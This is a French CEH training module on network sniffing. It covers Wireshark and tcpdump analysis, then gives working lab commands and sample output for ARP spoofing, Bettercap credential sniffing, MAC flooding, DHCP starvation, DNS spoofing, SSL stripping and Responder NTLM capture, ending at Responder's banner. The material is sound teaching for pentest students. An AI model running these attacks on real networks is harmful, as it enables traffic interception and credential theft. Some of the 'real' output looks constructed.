# 🛡️ CEH v12 — MODULE 8 : SNIFFING
### Guide pédagogique avancé — Analyse réseau complète | ML | exploit4040

---

## 📌 INTRODUCTION — LE SNIFFING, L'ART D'ÉCOUTER LE RÉSEAU

Le réseau est le **système nerveux** de toute organisation. Chaque donnée échangée — emails, mots de passe, fichiers — transite par des câbles et des ondes radio.

Le **sniffing** c'est l'art de **capturer et analyser ces données en transit**. C'est une compétence double :

```
SNIFFING DÉFENSIF (Blue Team) :
├── Analyser le trafic pour détecter des anomalies
├── Investiguer des incidents de sécurité
├── Diagnostiquer des problèmes réseau
└── Surveiller les connexions suspectes

SNIFFING OFFENSIF (Red Team / Pentest) :
├── Capturer des credentials en clair
├── Réaliser des attaques Man-in-the-Middle
├── Intercepter des sessions non chiffrées
└── Analyser des protocoles propriétaires
```

> **Règle professionnelle absolue :** Le sniffing sans autorisation est une **violation de la vie privée et un crime**. Dans un pentest, il doit être explicitement mentionné dans les Rules of Engagement.

---

## 📌 PARTIE 1 : FONDAMENTAUX RÉSEAU POUR LE SNIFFING

### 🔵 Comment les données circulent — Rappel critique

#### Le mode Promiscuous vs Normal

```
MODE NORMAL (default) :
═══════════════════════
Carte réseau (NIC) reçoit TOUS les paquets
                    │
                    ▼
Vérifie l'adresse MAC destination
                    │
          ┌─────────┴──────────┐
    MAC = la mienne        MAC ≠ la mienne
          │                    │
     Traite le paquet      IGNORE le paquet
     (remonte au kernel)

→ On ne voit que son propre trafic

MODE PROMISCUOUS :
══════════════════
Carte réseau reçoit TOUS les paquets
                    │
                    ▼
Traite TOUS les paquets
(peu importe la MAC destination)
                    │
                    ▼
Remonte TOUT au kernel → Wireshark les capture

→ On voit TOUT le trafic qui passe
```

```bash
# Activer le mode promiscuous
sudo ip link set eth0 promisc on

# Vérifier
ip link show eth0
```

**Sortie :**
```
2: eth0: <BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP> mtu 1500 qdisc pq state UP
    link/ether 08:00:27:a1:bc:de brd ff:ff:ff:ff:ff:ff
    
                              ↑
                           PROMISC = mode promiscuous actif
```

---

#### Hub vs Switch — Pourquoi le sniffing est plus difficile sur switch

```
RÉSEAU HUB (technologie ancienne) :
════════════════════════════════════

Machine A ──┐
Machine B ──┤── HUB ──> Broadcast de TOUT à TOUS
Machine C ──┘

→ Chaque machine reçoit les paquets de tous les autres
→ Sniffing trivial : mode promiscuous suffit
→ Hubs quasi-disparus aujourd'hui

RÉSEAU SWITCH (standard actuel) :
══════════════════════════════════

Machine A ──┐
Machine B ──┤── SWITCH ──> Envoie les paquets UNIQUEMENT
Machine C ──┘              à la destination correcte

Le switch maintient une TABLE CAM :
┌─────────────────────────────────────────┐
│  MAC Address        │  Port  │  VLAN    │
├─────────────────────────────────────────┤
│  08:00:27:A1:BC:DE  │  1     │  1       │
│  00:50:56:C0:00:08  │  2     │  1       │
│  52:54:00:12:34:56  │  3     │  1       │
└─────────────────────────────────────────┘

→ Machine A envoie à Machine B :
  Switch lit la MAC destination
  Envoie UNIQUEMENT sur le port 2
  Machine C ne voit rien

→ Sniffing sur switch = IMPOSSIBLE en mode normal
→ Il faut des techniques spéciales (ARP Spoofing, MAC Flooding...)
```

---

### 🔵 Protocoles vulnérables vs Protocoles sécurisés

```
PROTOCOLES EN CLAIR (sniffables) :
══════════════════════════════════════════════════════════════
Protocol  Port   Données exposées          Danger
────────  ────   ──────────────────────    ───────────────────
HTTP      80     Pages web, cookies,       CRITIQUE
                 formulaires, tokens
FTP       21     Credentials, données      CRITIQUE
Telnet    23     Session complète,         CRITIQUE
                 commandes, mots de passe
SMTP      25     Emails, credentials       HAUT
POP3      110    Emails, credentials       HAUT
IMAP      143    Emails, credentials       HAUT
SNMP v1/2 161    Community strings,        HAUT
                 données de config
DNS       53     Requêtes DNS              MOYEN
                 (vie privée)
LDAP      389    Données annuaire          HAUT
RDP       3389   Sessions bureau distant   HAUT (si non chiffré)

PROTOCOLES CHIFFRÉS (résistants au sniffing) :
══════════════════════════════════════════════════════════════
HTTPS     443    TLS/SSL → données chiffrées
SFTP      22     SSH → chiffré
SSH       22     Tout chiffré
SMTPS     465    SMTP sur TLS
IMAPS     993    IMAP sur TLS
POP3S     995    POP3 sur TLS
LDAPS     636    LDAP sur TLS
SNMPv3    161    Authentification + chiffrement
```

---

## 📌 PARTIE 2 : WIRESHARK — MAÎTRISE COMPLÈTE

**Wireshark** est l'analyseur de protocoles réseau le plus utilisé au monde. Outil indispensable pour l'analyse défensive et offensive.

---

### 🛠️ Démarrage et capture

```bash
# Lancer Wireshark en mode graphique
sudo wireshark

# Lancer en ligne de commande (tshark)
sudo tshark -i eth0

# Capture dans un fichier
sudo tshark -i eth0 -w capture.pcap

# Lire un fichier existant
wireshark capture.pcap
tshark -r capture.pcap
```

---

### 🛠️ Filtres Wireshark essentiels

Les filtres Wireshark sont de deux types :

```
CAPTURE FILTERS (Berkeley Packet Filter - BPF) :
→ Appliqués PENDANT la capture
→ Syntaxe tcpdump
→ Moins flexibles mais plus performants

DISPLAY FILTERS :
→ Appliqués SUR une capture existante
→ Syntaxe Wireshark propre
→ Très expressifs et puissants
```

#### Filtres de capture (BPF)

```bash
# Capturer uniquement HTTP
sudo tshark -i eth0 -f "tcp port 80"

# Capturer tout sauf le broadcast
sudo tshark -i eth0 -f "not broadcast"

# Capturer trafic vers/depuis une IP
sudo tshark -i eth0 -f "host 192.168.1.10"

# Capturer entre deux machines
sudo tshark -i eth0 -f "host 192.168.1.10 and host 192.168.1.20"

# Capturer sur un réseau entier
sudo tshark -i eth0 -f "net 192.168.1.0/24"

# Capturer uniquement SYN packets
sudo tshark -i eth0 -f "tcp[tcpflags] & tcp-syn != 0"
```

---

#### Filtres d'affichage Wireshark

```
FILTRES PAR PROTOCOLE :
════════════════════════════════════════════════════════════

http                    → Tout le trafic HTTP
http.request            → Requêtes HTTP uniquement
http.response           → Réponses HTTP uniquement
http.request.method == "POST"  → Formulaires POST (credentials !)
http.request.uri contains "login"  → Pages de login
ftp                     → Trafic FTP
ftp.request.command == "PASS"  → Mots de passe FTP !
telnet                  → Sessions Telnet
dns                     → Requêtes DNS
dns.qry.name contains "malware"  → DNS suspects
smtp                    → Emails SMTP
pop                     → POP3
imap                    → IMAP
arp                     → Trafic ARP
icmp                    → Pings
ssl / tls               → Trafic SSL/TLS
ssh                     → Trafic SSH

FILTRES PAR ADRESSE :
════════════════════════════════════════════════════════════

ip.addr == 192.168.1.10        → Tout trafic vers/depuis cette IP
ip.src == 192.168.1.10         → Trafic SOURCE de cette IP
ip.dst == 192.168.1.10         → Trafic DESTINATION vers cette IP
ip.addr == 192.168.1.0/24      → Tout un sous-réseau
eth.addr == 08:00:27:a1:bc:de  → Par adresse MAC

FILTRES PAR PORT :
════════════════════════════════════════════════════════════

tcp.port == 80          → Port TCP 80
tcp.dstport == 443      → Destination port 443
tcp.srcport == 4444     → Source port 4444 (Metasploit !)
udp.port == 53          → DNS UDP
tcp.port in {80 443 8080 8443}  → Plusieurs ports

FILTRES PAR FLAGS TCP :
════════════════════════════════════════════════════════════

tcp.flags.syn == 1              → Paquets SYN
tcp.flags.syn == 1 and tcp.flags.ack == 0  → SYN sans ACK (scan !)
tcp.flags.rst == 1              → Resets TCP
tcp.flags.fin == 1              → Fermetures
tcp.analysis.retransmission    → Retransmissions

FILTRES AVANCÉS :
════════════════════════════════════════════════════════════

frame contains "password"       → Chercher "password" dans les données
tcp contains "username"         → "username" dans trafic TCP
http.request.uri contains "admin"  → URLs admin
!(ip.addr == 192.168.1.1)       → Exclure une IP
http and ip.src == 192.168.1.20 → HTTP depuis une machine précise
```

---

### 📊 WIRESHARK — Analyse d'une capture réelle

**Scénario : Capture d'un login FTP**

```bash
sudo tshark -i eth0 -r ftp_capture.pcap -Y "ftp" -T fields \
     -e ip.src -e ip.dst -e ftp.request.command -e ftp.request.arg
```

**Sortie réelle :**
```
192.168.1.5  192.168.1.10  USER  msfadmin
192.168.1.5  192.168.1.10  PASS  msfadmin
192.168.1.5  192.168.1.10  TYPE  I
192.168.1.5  192.168.1.10  PORT  192,168,1,5,195,149
192.168.1.5  192.168.1.10  LIST
192.168.1.5  192.168.1.10  RETR  backup_passwords.txt
192.168.1.5  192.168.1.10  QUIT
```

> **Credentials capturés en clair : msfadmin / msfadmin**

---

**Scénario : Capturer un formulaire HTTP POST**

```bash
tshark -r http_capture.pcap -Y "http.request.method == POST" \
       -T fields -e ip.src -e http.request.uri -e urlencoded-form.value
```

**Sortie réelle :**
```
192.168.1.20  /dvwa/login.php  admin&password&Login=Login
```

```bash
# Reconstruction complète du flux HTTP
tshark -r http_capture.pcap -Y "http" -z follow,tcp,ascii,0
```

**Sortie :**
```
===================================================================
Follow: tcp,ascii
Filter: tcp.stream eq 0
Node 0: 192.168.1.20:52341
Node 1: 192.168.1.10:80
===================================================================

POST /dvwa/login.php HTTP/1.1
Host: 192.168.1.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Firefox/95.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

username=admin&password=password&Login=Login

HTTP/1.1 302 Found
Location: /dvwa/index.php
Set-Cookie: PHPSESSID=abc123def456gh789; path=/
Set-Cookie: security=low; path=/

→ Login réussi ! Cookie de session capturé : abc123def456gh789
```

---

**Scénario : Détecter un scan Nmap**

```bash
tshark -r nmap_scan.pcap -Y "tcp.flags.syn == 1 and tcp.flags.ack == 0" \
       -T fields -e ip.src -e ip.dst -e tcp.dstport | head -20
```

**Sortie :**
```
192.168.1.5  192.168.1.10  21
192.168.1.5  192.168.1.10  22
192.168.1.5  192.168.1.10  23
192.168.1.5  192.168.1.10  25
192.168.1.5  192.168.1.10  53
192.168.1.5  192.168.1.10  80
192.168.1.5  192.168.1.10  110
192.168.1.5  192.168.1.10  139
192.168.1.5  192.168.1.10  443
192.168.1.5  192.168.1.10  445
192.168.1.5  192.168.1.10  3306
192.168.1.5  192.168.1.10  5432
192.168.1.5  192.168.1.10  5900
192.168.1.5  192.168.1.10  8180

→ SYN vers des dizaines de ports différents depuis la même IP
→ DÉTECTION : SCAN DE PORT EN COURS depuis 192.168.1.5
```

---

### 🛠️ TCPDUMP — Capture en ligne de commande

**tcpdump** est l'outil de capture réseau sans interface graphique — indispensable sur les serveurs.

```bash
# Capture basique sur eth0
sudo tcpdump -i eth0

# Avec résolution DNS désactivée (-n) et verbeux (-v)
sudo tcpdump -i eth0 -n -v

# Capturer les 100 premiers paquets
sudo tcpdump -i eth0 -c 100

# Sauvegarder dans un fichier
sudo tcpdump -i eth0 -w capture.pcap

# Lire un fichier PCAP
tcpdump -r capture.pcap

# Afficher en hexadécimal + ASCII
tcpdump -i eth0 -X

# Capturer le trafic HTTP
sudo tcpdump -i eth0 -A port 80

# Filtrer par IP source
sudo tcpdump -i eth0 src host 192.168.1.10

# Capturer Telnet et afficher le contenu
sudo tcpdump -i eth0 port 23 -A
```

**Sortie tcpdump session Telnet :**
```
sudo tcpdump -i eth0 port 23 -A -n

18:30:12.123456 IP 192.168.1.5.52341 > 192.168.1.10.23:
Flags [P.], seq 1:20, ack 100, win 229
  .....root
18:30:12.234567 IP 192.168.1.5.52341 > 192.168.1.10.23:
Flags [P.], seq 20:30, ack 120, win 229
  .....toor
18:30:12.345678 IP 192.168.1.10.23 > 192.168.1.5.52341:
Flags [P.], seq 120:145, ack 30, win 227
  Last login: Fri Nov 15...
  root@metasploitable:~#

→ Username: root | Password: toor → EN CLAIR sur Telnet !
```

---

## 📌 PARTIE 3 : ARP SPOOFING — L'ATTAQUE MITM FONDAMENTALE

### 🔵 Comprendre ARP en profondeur

**ARP (Address Resolution Protocol)** traduit les adresses IP en adresses MAC sur un réseau local.

```
FONCTIONNEMENT NORMAL D'ARP :
══════════════════════════════════════════════════════════════

Machine A (192.168.1.20) veut parler à Machine B (192.168.1.10)

ÉTAPE 1 : A vérifie son cache ARP
  → Table ARP vide ou entrée expirée

ÉTAPE 2 : A envoie une ARP Request (Broadcast)
  "Qui a 192.168.1.10 ? Dites-le à 192.168.1.20"
  Destination MAC : FF:FF:FF:FF:FF:FF (broadcast)
  
    A ──── ARP Request ────> [BROADCAST → TOUT LE RÉSEAU]

ÉTAPE 3 : B répond avec une ARP Reply (Unicast)
  "192.168.1.10 est à l'adresse MAC 00:50:56:C0:00:08"
  
    A <──── ARP Reply ──── B

ÉTAPE 4 : A met à jour son cache ARP
  192.168.1.10 → 00:50:56:C0:00:08

Table ARP de A :
┌──────────────────────────────────────────────┐
│  IP Address      │  MAC Address              │
├──────────────────────────────────────────────┤
│  192.168.1.1     │  C8:D7:19:AB:12:3F        │
│  192.168.1.10    │  00:50:56:C0:00:08        │
└──────────────────────────────────────────────┘
```

---

### 🔵 La Vulnérabilité Fondamentale d'ARP

```
PROBLÈME CRITIQUE :
═══════════════════════════════════════════════════════════════

ARP est un protocole SANS ÉTAT et SANS AUTHENTIFICATION.

→ N'importe qui peut envoyer une ARP Reply SANS qu'une
  ARP Request ait été envoyée.

→ Les machines acceptent les ARP Replies non sollicitées
  et mettent à jour leur cache.

→ Il est donc possible d'empoisonner le cache ARP
  de n'importe quelle machine sur le réseau local.

C'est l'ARP Poisoning / ARP Spoofing.
```

---

### 🔵 ARP Spoofing — Mécanisme complet

```
SCÉNARIO D'ATTAQUE ARP SPOOFING :
══════════════════════════════════════════════════════════════

Topologie initiale :
├── Victime    : 192.168.1.20 (MAC: 52:54:00:12:34:56)
├── Routeur    : 192.168.1.1  (MAC: C8:D7:19:AB:12:3F)
└── Attaquant  : 192.168.1.5  (MAC: 08:00:27:A1:BC:DE)

ÉTAT INITIAL des tables ARP :
Victime : 192.168.1.1 → C8:D7:19:AB:12:3F (routeur légitime)
Routeur : 192.168.1.20 → 52:54:00:12:34:56 (victime légitime)

ATTAQUE :
L'attaquant envoie en continu :

À la Victime :
"192.168.1.1 (le routeur) est à 08:00:27:A1:BC:DE"
→ Victime met à jour : 192.168.1.1 → 08:00:27:A1:BC:DE (NOTRE MAC !)

Au Routeur :
"192.168.1.20 (la victime) est à 08:00:27:A1:BC:DE"
→ Routeur met à jour : 192.168.1.20 → 08:00:27:A1:BC:DE (NOTRE MAC !)

RÉSULTAT :
Victime → Routeur : passe PAR L'ATTAQUANT
Routeur → Victime : passe PAR L'ATTAQUANT

Flux de données :
Victime ──→ Attaquant ──→ Routeur ──→ Internet
        ←──            ←──

L'attaquant est au MILIEU → Man-in-the-Middle (MITM)
```

---

### 🛠️ ARPSPOOF — ARP Poisoning classique

```bash
# Activer le forwarding IP (pour ne pas couper internet à la victime)
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1

# Vérifier
cat /proc/sys/net/ipv4/ip_forward
# → 1

# Terminal 1 : Empoisonner la victime
# "Dis à 192.168.1.20 que le routeur (192.168.1.1) c'est moi"
sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
```

**Sortie Terminal 1 :**
```
08:00:27:a1:bc:de 52:54:00:12:34:56 0806 42: arp reply
    192.168.1.1 is-at 08:00:27:a1:bc:de

08:00:27:a1:bc:de 52:54:00:12:34:56 0806 42: arp reply
    192.168.1.1 is-at 08:00:27:a1:bc:de

08:00:27:a1:bc:de 52:54:00:12:34:56 0806 42: arp reply
    192.168.1.1 is-at 08:00:27:a1:bc:de

[Envoi toutes les 2 secondes pour maintenir l'empoisonnement]
```

```bash
# Terminal 2 : Empoisonner le routeur
# "Dis au routeur que la victime (192.168.1.20) c'est moi"
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.20
```

**Sortie Terminal 2 :**
```
08:00:27:a1:bc:de c8:d7:19:ab:12:3f 0806 42: arp reply
    192.168.1.20 is-at 08:00:27:a1:bc:de

08:00:27:a1:bc:de c8:d7:19:ab:12:3f 0806 42: arp reply
    192.168.1.20 is-at 08:00:27:a1:bc:de
```

```bash
# Vérifier la table ARP de la victime (sur la victime)
arp -a
```

**Sortie ARP de la victime APRÈS empoisonnement :**
```
? (192.168.1.1) at 08:00:27:a1:bc:de [ether] on eth0
                   ↑ MAC de l'ATTAQUANT ! (devrait être C8:D7:19...)
? (192.168.1.5) at 08:00:27:a1:bc:de [ether] on eth0
? (192.168.1.10) at 00:50:56:c0:00:08 [ether] on eth0

→ ARP CACHE EMPOISONNÉ CONFIRMÉ !
→ Tout le trafic internet de la victime passe maintenant par l'attaquant
```

```bash
# Terminal 3 : Capturer le trafic intercepté
sudo wireshark -i eth0 &
# Ou avec tshark
sudo tshark -i eth0 -Y "ip.addr == 192.168.1.20" -w victime_traffic.pcap
```

---

## 📌 PARTIE 4 : BETTERCAP — L'OUTIL MITM MODERNE

**Bettercap** est l'outil MITM le plus puissant et le plus moderne. Il unifie ARP spoofing, sniffing, SSL stripping, et bien plus.

---

### 🛠️ Installation et démarrage

```bash
# Installation
sudo apt install bettercap

# Démarrage interactif
sudo bettercap -iface eth0
```

**Interface Bettercap :**
```
bettercap v2.32.0 (built for linux amd64 with go1.17.5) [type 'help' for a list of commands]

192.168.1.0/24 > 192.168.1.5  » help

Available commands:

  help [module]             → List available commands or module specific help
  active                    → Show active modules
  quit                      → Close the session
  sleep SECONDS             → Sleep for the given amount of seconds
  get NAME                  → Get the value of variable NAME
  set NAME VALUE            → Set the value of variable NAME
  read VARIABLE PROMPT      → Show a prompt to ask the user for input
  clear                     → Clear the screen
  include CAPLET            → Load and run a caplet
  ! COMMAND                 → Execute a shell command

Available modules:

  any.proxy                 → A full featured transparent proxy
  api.rest                  → RESTful API module
  arp.spoof                 → ARP spoofing module
  ble.recon                 → BLE devices discovery
  dhcp6.spoof               → DHCPv6 spoofing module
  dns.spoof                 → DNS spoofing module
  events.stream             → Live events streaming
  http.proxy                → HTTP proxy module
  http.server               → HTTP server module
  https.proxy               → HTTPS proxy module
  https.server              → HTTPS server module
  mac.changer               → MAC address changer
  net.probe                 → Network prober module
  net.recon                 → Network reconnaissance module
  net.sniff                 → Network sniffer module
  syn.scan                  → SYN port scanner module
  tcp.proxy                 → TCP proxy module
  wifi.recon                → WiFi recon module
```

---

### 🛠️ Découverte réseau avec Bettercap

```bash
# Scanner le réseau
192.168.1.0/24 > 192.168.1.5 » net.recon on
```

**Sortie :**
```
[18:45:12] [net.recon] new host : 192.168.1.1 C8:D7:19:AB:12:3F (Cisco Systems)
[18:45:13] [net.recon] new host : 192.168.1.10 08:00:27:A1:BC:DE (Oracle VirtualBox)
[18:45:14] [net.recon] new host : 192.168.1.15 00:50:56:C0:00:08 (VMware)
[18:45:15] [net.recon] new host : 192.168.1.20 52:54:00:12:34:56 (QEMU)

192.168.1.0/24 > 192.168.1.5 » net.show
```

**Sortie net.show :**
```
┌────────────────────────────────────────────────────────────────────────┐
│ IP              │ MAC               │ Name          │ Vendor           │
├────────────────────────────────────────────────────────────────────────┤
│ 192.168.1.1     │ C8:D7:19:AB:12:3F │ router        │ Cisco Systems    │
│ 192.168.1.5     │ 08:00:27:A1:BC:DE │ kali          │ Oracle VirtualBox│
│ 192.168.1.10    │ 08:00:27:A1:BC:DE │ metasploitable│ Oracle VirtualBox│
│ 192.168.1.15    │ 00:50:56:C0:00:08 │ win-server01  │ VMware           │
│ 192.168.1.20    │ 52:54:00:12:34:56 │ win7-client   │ QEMU             │
└────────────────────────────────────────────────────────────────────────┘
```

---

### 🛠️ ARP Spoofing avec Bettercap

```bash
# Configuration ARP spoofing sur toute la cible
192.168.1.0/24 > 192.168.1.5 » set arp.spoof.targets 192.168.1.20
192.168.1.0/24 > 192.168.1.5 » set arp.spoof.fullduplex true
192.168.1.0/24 > 192.168.1.5 » arp.spoof on
```

**Sortie :**
```
[18:46:00] [arp.spoof] full duplex ARP spoofing enabled
[18:46:00] [arp.spoof] arp spoofing 1 targets.
[18:46:02] [arp.spoof] spoofing 192.168.1.20 (52:54:00:12:34:56)
[18:46:02] [arp.spoof] → gateway 192.168.1.1 : telling 192.168.1.20 that gateway is at 08:00:27:a1:bc:de
[18:46:02] [arp.spoof] → target 192.168.1.20 : telling gateway that 192.168.1.20 is at 08:00:27:a1:bc:de
```

---

### 🛠️ Sniffing avec Bettercap

```bash
# Activer le sniffer réseau
192.168.1.0/24 > 192.168.1.5 » set net.sniff.verbose true
192.168.1.0/24 > 192.168.1.5 » net.sniff on
```

**Sortie — Credentials HTTP capturés :**
```
[18:46:15] [net.sniff] [192.168.1.20:52341 → 192.168.1.10:80]
           POST /dvwa/login.php HTTP/1.1
           Content-Type: application/x-www-form-urlencoded

           username=admin&password=password&Login=Login

[18:46:22] [net.sniff] [192.168.1.20:52342 → 192.168.1.10:21]
           FTP User: msfadmin
           FTP Pass: msfadmin

[18:46:35] [net.sniff] [192.168.1.20:52343 → 192.168.1.10:23]
           Telnet session:
           Username: root
           Password: toor

[18:47:01] [net.sniff] [192.168.1.20:52344 → 192.168.1.10:110]
           POP3 USER admin@corp.com
           POP3 PASS Corp2024!

[18:47:15] [net.sniff] [192.168.1.20:52345 → 8.8.8.8:53]
           DNS Query: www.corp-intranet.local
```

---

## 📌 PARTIE 5 : MAC FLOODING — DÉBORDER LA TABLE CAM

### 🔵 Principe

```
RAPPEL :
Le switch maintient une table CAM (Content Addressable Memory)
qui associe MAC Address ↔ Port.

Taille limitée : ~8 000 à 16 000 entrées selon le modèle.

ATTAQUE MAC FLOODING :
Envoyer des milliers de trames avec des MAC addresses
FAUSSES et ALÉATOIRES vers le switch.

Résultat :
└── Table CAM PLEINE
    └── Switch ne peut plus apprendre de nouvelles entrées
        └── Switch passe en mode FAILOPEN
            └── Se comporte comme un HUB
                └── Broadcast TOUT le trafic sur tous les ports !
                    └── Sniffing devient possible !
```

### 🛠️ MACOF — MAC Flooding tool

```bash
# Inonder la table CAM
sudo macof -i eth0 -n 100000
```

**Sortie :**
```
a2:cf:3b:1e:4d:7a a8:9b:c4:e6:f2:5d 0.0.0.0.47193 > 0.0.0.0.43856: S 1972789729:1972789729(0) win 512
7d:4e:a1:2c:8f:b3 f3:9c:d7:0a:1e:6c 0.0.0.0.29831 > 0.0.0.0.12957: S 1156834021:1156834021(0) win 512
3f:8b:c2:5a:9d:e4 b1:4f:a6:3e:7c:d9 0.0.0.0.58273 > 0.0.0.0.34816: S 847291056:847291056(0) win 512
[...des milliers de lignes...]

→ Switch en mode failopen → tout le réseau sniffable !
```

---

## 📌 PARTIE 6 : DHCP STARVATION ET ROGUE DHCP

### 🔵 DHCP Starvation

```
PRINCIPE :
DHCP attribue des baux IP aux machines qui se connectent.
Pool d'adresses disponibles est limité (ex: 192.168.1.100-200 = 100 adresses).

ATTAQUE :
Envoyer des DHCP DISCOVER en masse avec des MAC addresses aléatoires.
→ Le serveur DHCP attribue toutes ses adresses à de fausses machines.
→ Pool épuisé.
→ Les vraies machines ne peuvent plus obtenir d'adresse IP.
→ DÉNI DE SERVICE réseau !
```

### 🛠️ YERSINIA — Attaques DHCP

```bash
# Mode interactif
sudo yersinia -G    # Interface graphique

# Mode ligne de commande - DHCP Starvation
sudo yersinia dhcp -attack 1 -interface eth0
```

**Sortie :**
```
Yersinia 0.8.2

Sending 1000 DHCP DISCOVER packets...

Sending DHCP DISCOVER from MAC: 00:11:22:33:44:55
  Server response: DHCP OFFER 192.168.1.101
Sending DHCP DISCOVER from MAC: 00:11:22:33:44:56
  Server response: DHCP OFFER 192.168.1.102
[...]
Sending DHCP DISCOVER from MAC: 00:11:22:33:44:C7
  Server response: DHCP OFFER 192.168.1.200
Sending DHCP DISCOVER from MAC: 00:11:22:33:44:C8
  Server response: NO RESPONSE (pool exhausted!)

DHCP Pool épuisé en 4.2 secondes !
100 adresses allouées à de fausses machines.
```

---

### 🔵 Rogue DHCP Server

```
PRINCIPE :
Après DHCP Starvation (ou simultanément) :
→ L'attaquant lance son propre serveur DHCP malveillant.
→ Les machines qui cherchent un IP reçoivent une réponse de l'attaquant.
→ L'attaquant contrôle la config réseau des victimes :
   ├── Passerelle par défaut = l'attaquant → MITM automatique !
   ├── Serveur DNS = l'attaquant → DNS Spoofing !
   └── Serveur WINS = l'attaquant

C'est un MITM passif : pas besoin d'ARP spoofing continu !
```

---

## 📌 PARTIE 7 : DNS SPOOFING / POISONING

### 🔵 Comprendre le DNS Cache Poisoning

```
FONCTIONNEMENT DNS NORMAL :
════════════════════════════════════════════════════════════

Navigateur → DNS Resolver local → DNS Serveur récursif → DNS Autoritaire
                   ↕
             Cache DNS local
             (TTL = durée de vie)

DNS CACHE POISONING :
Injecter de fausses entrées DNS dans le cache d'un resolver.
→ www.banque.com → 192.168.1.5 (IP de l'attaquant)
→ Toutes les victimes utilisant ce resolver sont redirigées !
```

### 🛠️ DNS Spoofing avec Bettercap

```bash
# Configurer le DNS spoofing
192.168.1.0/24 > 192.168.1.5 » set dns.spoof.domains facebook.com,google.com
192.168.1.0/24 > 192.168.1.5 » set dns.spoof.address 192.168.1.5
192.168.1.0/24 > 192.168.1.5 » dns.spoof on
```

**Sortie :**
```
[18:50:00] [dns.spoof] spoofing 2 domain(s)
[18:50:12] [dns.spoof] 192.168.1.20 is asking for facebook.com
           → replying with 192.168.1.5 (instead of 157.240.241.35)

[18:50:13] [dns.spoof] 192.168.1.20 is asking for www.facebook.com
           → replying with 192.168.1.5 (instead of 157.240.241.35)

[18:50:18] [dns.spoof] 192.168.1.20 is asking for google.com
           → replying with 192.168.1.5 (instead of 142.250.185.46)
```

**Vérification sur la machine victime :**
```cmd
nslookup facebook.com
Server:   192.168.1.1
Address:  192.168.1.1#53

Name: facebook.com
Address: 192.168.1.5    ← FAUSSE ADRESSE ! (notre machine)
                           Devrait être 157.240.241.35
```

---

## 📌 PARTIE 8 : SSL STRIPPING — DOWNGRADER HTTPS EN HTTP

### 🔵 Comprendre SSL Stripping

```
PROBLÈME QUE RÉSOUT SSL STRIPPING :
════════════════════════════════════════════════════════════

HTTPS chiffre le trafic → Sniffing inefficace
Même avec MITM, on ne voit que du trafic chiffré.

SOLUTION : SSL Stripping (Moxie Marlinspike, 2009)
════════════════════════════════════════════════════════════

FLUX NORMAL HTTPS :
Victime ──── HTTPS ────> www.banque.com

FLUX APRÈS SSL STRIPPING :
                ┌─────────────────────────────────────────┐
Victime ──HTTP──> Attaquant ──── HTTPS ────> www.banque.com
        (non     (MITM position)            (connexion chiffrée
        chiffré!)                            avec le vrai site)

MÉCANISME :
1. Victime tente de se connecter à https://www.banque.com
2. L'attaquant (position MITM) intercepte la requête
3. L'attaquant se connecte lui-même en HTTPS au vrai site
4. L'attaquant sert la page à la victime en HTTP (sans S !)
5. La victime pense être en HTTP → pas d'alerte
6. Tout le trafic de la victime passe en clair par l'attaquant

CONDITION : La victime doit taper l'URL sans "https://"
            ou cliquer sur un lien HTTP.
CONTRE-MESURE : HSTS (HTTP Strict Transport Security)
```

### 🛠️ SSL Stripping avec Bettercap

```bash
# Configuration SSL stripping
192.168.1.0/24 > 192.168.1.5 » set arp.spoof.targets 192.168.1.20
192.168.1.0/24 > 192.168.1.5 » arp.spoof on

192.168.1.0/24 > 192.168.1.5 » set https.proxy.sslstrip true
192.168.1.0/24 > 192.168.1.5 » https.proxy on
192.168.1.0/24 > 192.168.1.5 » http.proxy on
192.168.1.0/24 > 192.168.1.5 » net.sniff on
```

**Sortie — Credentials HTTPS capturés via SSL Strip :**
```
[18:55:00] [arp.spoof] ARP spoofing 192.168.1.20
[18:55:05] [https.proxy] SSL stripping active

[18:55:23] [http.proxy] [192.168.1.20:52401 → www.facebook.com:80]
           GET http://www.facebook.com/ HTTP/1.1
           → Connexion dégradée de HTTPS à HTTP !

[18:55:45] [net.sniff] [192.168.1.20:52402 → www.facebook.com:80]
           POST http://www.facebook.com/login/ HTTP/1.1

           email=jean.muamba%40corp.com&pass=Kinshasa2024!

           ↑ CREDENTIALS FACEBOOK CAPTURÉS EN CLAIR !
```

---

## 📌 PARTIE 9 : RESPONDER — CAPTURE DE HASHES NTLM

**Responder** est l'outil de référence pour capturer des **hashes NTLMv2** sur un réseau Windows via le poisoning de protocoles de résolution de noms.

```
PROTOCOLES EXPLOITÉS PAR RESPONDER :
├── LLMNR  (Link-Local Multicast Name Resolution)
│   → Résolution de noms sur le réseau local
│   → Utilisé quand DNS échoue
│
├── NBT-NS (NetBIOS Name Service)
│   → Résolution de noms NetBIOS
│   → Toujours présent sur les réseaux Windows
│
└── mDNS   (Multicast DNS)
    → Résolution DNS locale sans serveur

MÉCANISME :
1. Machine Windows cherche un partage réseau
   \\serveur-inexistant\share
2. DNS ne trouve pas "serveur-inexistant"
3. Windows envoie une requête LLMNR/NBT-NS en broadcast
   "Quelqu'un connaît serveur-inexistant ?"
4. Responder répond : "Oui, c'est moi !"
5. Windows tente une authentification NTLM
6. Responder capture le hash NTLMv2
7. Hash crackable offline avec Hashcat !
```

```bash
# Lancer Responder
sudo responder -I eth0 -wrf
```

**Sortie réelle :**
```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
